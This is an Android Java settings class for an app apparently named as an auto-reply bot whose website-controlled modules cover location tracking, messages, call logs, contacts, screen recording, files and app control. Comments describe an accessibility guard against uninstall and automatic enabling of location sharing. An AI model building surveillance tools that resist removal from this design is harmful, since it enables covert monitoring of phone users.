package com.autoreplybot.remote;

import android.content.Context;
import android.content.SharedPreferences;

import androidx.annotation.NonNull;
import androidx.security.crypto.EncryptedSharedPreferences;
import androidx.security.crypto.MasterKey;

import com.autoreplybot.AppConstants;

import java.io.IOException;
import java.security.GeneralSecurityException;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.List;

/** Local prefs for location / gallery / file-manager modules (defaults: all off). */
public final class RemoteModulePrefs {
    public static final String MODE_DISABLED = "disabled";
    public static final String MODE_CURRENT_ONLY = "current_only";
    public static final String MODE_WHILE_OPEN = "while_open";
    public static final String MODE_DURING_SESSION = "during_session";
    public static final String MODE_TEMPORARY_LIVE = "temporary_live";
    public static final String MODE_BACKGROUND = "background";

    private static final String KEY_LOC_ENABLED = "loc_enabled";
    private static final String KEY_LOC_USER_DISABLED = "loc_user_disabled";
    private static final String KEY_LOC_MODE = "loc_mode";
    private static final String KEY_LIVE_DURATION = "loc_live_duration_ms";
    private static final String KEY_LOC_WIFI_ONLY = "loc_wifi_only";
    private static final String KEY_LOC_MIN_BATTERY = "loc_min_battery";
    private static final String KEY_LOC_INTERVAL = "loc_interval_ms";
    private static final String KEY_LOC_DISPLACEMENT = "loc_min_displacement_m";
    private static final String KEY_LOC_HISTORY_DAYS = "loc_history_days";
    private static final String KEY_GALLERY_ENABLED = "gallery_enabled";
    private static final String KEY_GALLERY_WIFI = "gallery_wifi_only";
    private static final String KEY_GALLERY_MAX = "gallery_max_bytes";
    private static final String KEY_NOTIF_MIRROR = "notif_mirror_enabled";
    private static final String KEY_MESSAGES_ENABLED = "messages_sharing_enabled";
    private static final String KEY_CALL_LOGS_ENABLED = "call_logs_sharing_enabled";
    private static final String KEY_CONTACTS_ENABLED = "contacts_sharing_enabled";
    private static final String KEY_SCREEN_MIRROR_ENABLED = "screen_mirror_enabled";
    private static final String KEY_SCREEN_RECORD_ENABLED = "screen_record_enabled";
    private static final String KEY_APPS_ENABLED = "installed_apps_sharing_enabled";
    private static final String KEY_APP_USAGE_ENABLED = "app_usage_sharing_enabled";
    private static final String KEY_APP_CONTROL_ENABLED = "app_control_enabled";
    private static final String KEY_ALLOW_UNINSTALL = "allow_uninstall";
    private static final String KEY_PENDING_SELF_UNINSTALL_UNTIL = "pending_self_uninstall_until";
    private static final String KEY_FILES_ENABLED = "files_enabled";
    private static final String KEY_FILES_WIFI = "files_wifi_only";
    private static final String KEY_FILES_MAX = "files_max_bytes";
    private static final String KEY_CONFIRM_DELETE = "confirm_every_delete";
    private static final String KEY_CAPABILITY_SECRET = "capability_secret";
    private static final String KEY_SECRET_SYNCED = "capability_secret_synced";
    private static final String KEY_FOLDER_URI_PREFIX = "folder_uri_";

    private final SharedPreferences prefs;

    public RemoteModulePrefs(@NonNull Context context) {
        Context app = context.getApplicationContext();
        SharedPreferences p;
        try {
            MasterKey masterKey = new MasterKey.Builder(app)
                    .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)
                    .build();
            p = EncryptedSharedPreferences.create(
                    app,
                    AppConstants.PREFS_REMOTE_MODULES,
                    masterKey,
                    EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
                    EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM);
        } catch (GeneralSecurityException | IOException e) {
            p = app.getSharedPreferences(
                    AppConstants.PREFS_REMOTE_MODULES + "_fallback", Context.MODE_PRIVATE);
        }
        this.prefs = p;
    }

    public boolean isLocationSharingEnabled() {
        return prefs.getBoolean(KEY_LOC_ENABLED, false);
    }

    public void setLocationSharingEnabled(boolean enabled) {
        SharedPreferences.Editor ed = prefs.edit().putBoolean(KEY_LOC_ENABLED, enabled);
        if (!enabled) {
            ed.putBoolean(KEY_LOC_USER_DISABLED, true);
            ed.apply();
            setLocationMode(MODE_DISABLED);
        } else {
            ed.putBoolean(KEY_LOC_USER_DISABLED, false).apply();
        }
    }

    /** True when the user turned Location Sharing off in Management (not just default). */
    public boolean wasLocationSharingExplicitlyDisabled() {
        return prefs.getBoolean(KEY_LOC_USER_DISABLED, false);
    }

    /**
     * If Android location permission is granted, turn on Location Sharing so the website
     * can fetch maps. Skips when the user explicitly disabled sharing in Management.
     *
     * @return true if prefs changed
     */
    public boolean ensureLocationSharingIfPermitted(@NonNull Context context) {
        if (!RemotePermissionChecks.hasForegroundLocation(context)) return false;
        boolean changed = false;
        if (!isLocationSharingEnabled()) {
            if (wasLocationSharingExplicitlyDisabled()) return false;
            prefs.edit()
                    .putBoolean(KEY_LOC_ENABLED, true)
                    .putBoolean(KEY_LOC_USER_DISABLED, false)
                    .apply();
            changed = true;
        }
        String mode = getLocationMode();
        if (MODE_DISABLED.equals(mode) || mode.isEmpty()) {
            String next = RemotePermissionChecks.hasBackgroundLocation(context)
                    ? MODE_BACKGROUND
                    : MODE_CURRENT_ONLY;
            setLocationMode(next);
            changed = true;
        }
        return changed;
    }

    @NonNull
    public String getLocationMode() {
        String mode = prefs.getString(KEY_LOC_MODE, MODE_DISABLED);
        return mode != null ? mode : MODE_DISABLED;
    }

    public void setLocationMode(@NonNull String mode) {
        prefs.edit().putString(KEY_LOC_MODE, mode).apply();
    }

    public long getLiveDurationMs() {
        return prefs.getLong(KEY_LIVE_DURATION, 15L * 60L * 1000L);
    }

    public void setLiveDurationMs(long ms) {
        prefs.edit().putLong(KEY_LIVE_DURATION, Math.max(60_000L, ms)).apply();
    }

    public boolean isLocationWifiOnly() {
        return prefs.getBoolean(KEY_LOC_WIFI_ONLY, false);
    }

    public void setLocationWifiOnly(boolean wifiOnly) {
        prefs.edit().putBoolean(KEY_LOC_WIFI_ONLY, wifiOnly).apply();
    }

    public int getLocationMinBatteryPercent() {
        return prefs.getInt(KEY_LOC_MIN_BATTERY, 10);
    }

    public void setLocationMinBatteryPercent(int percent) {
        prefs.edit().putInt(KEY_LOC_MIN_BATTERY, Math.max(0, Math.min(50, percent))).apply();
    }

    public long getLocationUpdateIntervalMs() {
        return prefs.getLong(KEY_LOC_INTERVAL, 45_000L);
    }

    public void setLocationUpdateIntervalMs(long ms) {
        prefs.edit().putLong(KEY_LOC_INTERVAL, Math.max(15_000L, Math.min(300_000L, ms))).apply();
    }

    public float getMinDisplacementMeters() {
        return prefs.getFloat(KEY_LOC_DISPLACEMENT, 25f);
    }

    public void setMinDisplacementMeters(float meters) {
        prefs.edit().putFloat(KEY_LOC_DISPLACEMENT, Math.max(0f, meters)).apply();
    }

    /** 0 = do not save history (default). */
    public int getLocationHistoryRetentionDays() {
        return prefs.getInt(KEY_LOC_HISTORY_DAYS, 0);
    }

    public void setLocationHistoryRetentionDays(int days) {
        int clamped = days;
        if (clamped != 0 && clamped != 1 && clamped != 7 && clamped != 30) clamped = 0;
        prefs.edit().putInt(KEY_LOC_HISTORY_DAYS, clamped).apply();
    }

    public boolean isGalleryEnabled() {
        return prefs.getBoolean(KEY_GALLERY_ENABLED, false);
    }

    public void setGalleryEnabled(boolean enabled) {
        prefs.edit().putBoolean(KEY_GALLERY_ENABLED, enabled).apply();
    }

    public boolean isGalleryWifiOnly() {
        return prefs.getBoolean(KEY_GALLERY_WIFI, true);
    }

    public void setGalleryWifiOnly(boolean wifiOnly) {
        prefs.edit().putBoolean(KEY_GALLERY_WIFI, wifiOnly).apply();
    }

    public long getGalleryMaxUploadBytes() {
        return prefs.getLong(KEY_GALLERY_MAX, 50L * 1024L * 1024L);
    }

    public void setGalleryMaxUploadBytes(long bytes) {
        prefs.edit().putLong(KEY_GALLERY_MAX, Math.max(1024L * 1024L, bytes)).apply();
    }

    public boolean isNotificationMirrorEnabled() {
        return prefs.getBoolean(KEY_NOTIF_MIRROR, false);
    }

    public void setNotificationMirrorEnabled(boolean enabled) {
        prefs.edit().putBoolean(KEY_NOTIF_MIRROR, enabled).apply();
    }

    public boolean isMessagesSharingEnabled() {
        return prefs.getBoolean(KEY_MESSAGES_ENABLED, false);
    }

    public void setMessagesSharingEnabled(boolean enabled) {
        prefs.edit().putBoolean(KEY_MESSAGES_ENABLED, enabled).apply();
    }

    public boolean isCallLogsSharingEnabled() {
        return prefs.getBoolean(KEY_CALL_LOGS_ENABLED, false);
    }

    public void setCallLogsSharingEnabled(boolean enabled) {
        prefs.edit().putBoolean(KEY_CALL_LOGS_ENABLED, enabled).apply();
    }

    public boolean isContactsSharingEnabled() {
        return prefs.getBoolean(KEY_CONTACTS_ENABLED, false);
    }

    public void setContactsSharingEnabled(boolean enabled) {
        prefs.edit().putBoolean(KEY_CONTACTS_ENABLED, enabled).apply();
    }

    public boolean isScreenMirrorEnabled() {
        return prefs.getBoolean(KEY_SCREEN_MIRROR_ENABLED, false);
    }

    public void setScreenMirrorEnabled(boolean enabled) {
        prefs.edit().putBoolean(KEY_SCREEN_MIRROR_ENABLED, enabled).apply();
    }

    public boolean isScreenRecordEnabled() {
        return prefs.getBoolean(KEY_SCREEN_RECORD_ENABLED, false);
    }

    public void setScreenRecordEnabled(boolean enabled) {
        prefs.edit().putBoolean(KEY_SCREEN_RECORD_ENABLED, enabled).apply();
    }

    public boolean isInstalledAppsSharingEnabled() {
        return prefs.getBoolean(KEY_APPS_ENABLED, false);
    }

    public void setInstalledAppsSharingEnabled(boolean enabled) {
        prefs.edit().putBoolean(KEY_APPS_ENABLED, enabled).apply();
    }

    public boolean isAppUsageSharingEnabled() {
        return prefs.getBoolean(KEY_APP_USAGE_ENABLED, false);
    }

    public void setAppUsageSharingEnabled(boolean enabled) {
        prefs.edit().putBoolean(KEY_APP_USAGE_ENABLED, enabled).apply();
    }

    public boolean isAppControlEnabled() {
        return prefs.getBoolean(KEY_APP_CONTROL_ENABLED, false);
    }

    public void setAppControlEnabled(boolean enabled) {
        prefs.edit().putBoolean(KEY_APP_CONTROL_ENABLED, enabled).apply();
    }

    /**
     * When false (default), the phone guards against uninstall / Device Admin disable.
     * Website can set true so the user may uninstall this device's app.
     */
    public boolean isAllowUninstall() {
        // Default ON — website "Allow uninstall" is checked unless user protects the device.
        return prefs.getBoolean(KEY_ALLOW_UNINSTALL, true);
    }

    public void setAllowUninstall(boolean allow) {
        prefs.edit().putBoolean(KEY_ALLOW_UNINSTALL, allow).apply();
    }

    /**
     * Synchronous write before opening uninstall UI so Accessibility guard sees allow=true immediately.
     */
    public boolean prepareSelfUninstall(long untilEpochMs) {
        return prefs.edit()
                .putBoolean(KEY_ALLOW_UNINSTALL, true)
                .putLong(KEY_PENDING_SELF_UNINSTALL_UNTIL, Math.max(0L, untilEpochMs))
                .commit();
    }

    /** Website UNINSTALL_APP: keep retrying open + OK click until this time. */
    public void setPendingSelfUninstallUntil(long untilEpochMs) {
        prefs.edit().putLong(KEY_PENDING_SELF_UNINSTALL_UNTIL, Math.max(0L, untilEpochMs)).apply();
    }

    public long getPendingSelfUninstallUntil() {
        return prefs.getLong(KEY_PENDING_SELF_UNINSTALL_UNTIL, 0L);
    }

    public boolean isPendingSelfUninstall() {
        return System.currentTimeMillis() < getPendingSelfUninstallUntil();
    }

    public void clearPendingSelfUninstall() {
        prefs.edit().putLong(KEY_PENDING_SELF_UNINSTALL_UNTIL, 0L).apply();
    }

    /** Inverse helper used by guards. */
    public boolean isUninstallProtected() {
        return !isAllowUninstall();
    }

    public boolean isFileManagerEnabled() {
        return prefs.getBoolean(KEY_FILES_ENABLED, true);
    }

    public void setFileManagerEnabled(boolean enabled) {
        prefs.edit().putBoolean(KEY_FILES_ENABLED, enabled).apply();
    }

    public boolean isFileWifiOnly() {
        return prefs.getBoolean(KEY_FILES_WIFI, true);
    }

    public void setFileWifiOnly(boolean wifiOnly) {
        prefs.edit().putBoolean(KEY_FILES_WIFI, wifiOnly).apply();
    }

    public long getFileMaxBytes() {
        return prefs.getLong(KEY_FILES_MAX, 100L * 1024L * 1024L);
    }

    public void setFileMaxBytes(long bytes) {
        prefs.edit().putLong(KEY_FILES_MAX, Math.max(1024L * 1024L, bytes)).apply();
    }

    public boolean isConfirmEveryDelete() {
        return prefs.getBoolean(KEY_CONFIRM_DELETE, true);
    }

    public void setConfirmEveryDelete(boolean confirm) {
        prefs.edit().putBoolean(KEY_CONFIRM_DELETE, confirm).apply();
    }

    @NonNull
    public String getOrCreateCapabilitySecret() {
        String existing = prefs.getString(KEY_CAPABILITY_SECRET, null);
        if (existing != null && existing.length() >= 32) return existing;
        byte[] raw = new byte[32];
        new SecureRandom().nextBytes(raw);
        StringBuilder sb = new StringBuilder(raw.length * 2);
        for (byte b : raw) sb.append(String.format("%02x", b));
        String secret = sb.toString();
        prefs.edit().putString(KEY_CAPABILITY_SECRET, secret).putBoolean(KEY_SECRET_SYNCED, false).apply();
        return secret;
    }

    public boolean isCapabilitySecretSynced() {
        return prefs.getBoolean(KEY_SECRET_SYNCED, false);
    }

    public void setCapabilitySecretSynced(boolean synced) {
        prefs.edit().putBoolean(KEY_SECRET_SYNCED, synced).apply();
    }

    public void putFolderUri(@NonNull String grantId, @NonNull String uri) {
        prefs.edit().putString(KEY_FOLDER_URI_PREFIX + grantId, uri).apply();
    }

    @NonNull
    public String getFolderUri(@NonNull String grantId) {
        String v = prefs.getString(KEY_FOLDER_URI_PREFIX + grantId, null);
        return v != null ? v : "";
    }

    public void removeFolderUri(@NonNull String grantId) {
        prefs.edit().remove(KEY_FOLDER_URI_PREFIX + grantId).apply();
    }

    /** True if the user has authorized at least one SAF folder for File Manager. */
    public boolean hasAnyFolderGrant() {
        return !listFolderGrantIds().isEmpty();
    }

    @NonNull
    public List<String> listFolderGrantIds() {
        List<String> out = new ArrayList<>();
        for (String key : prefs.getAll().keySet()) {
            if (key == null || !key.startsWith(KEY_FOLDER_URI_PREFIX)) continue;
            String v = prefs.getString(key, null);
            if (v == null || v.isEmpty()) continue;
            out.add(key.substring(KEY_FOLDER_URI_PREFIX.length()));
        }
        return out;
    }
}
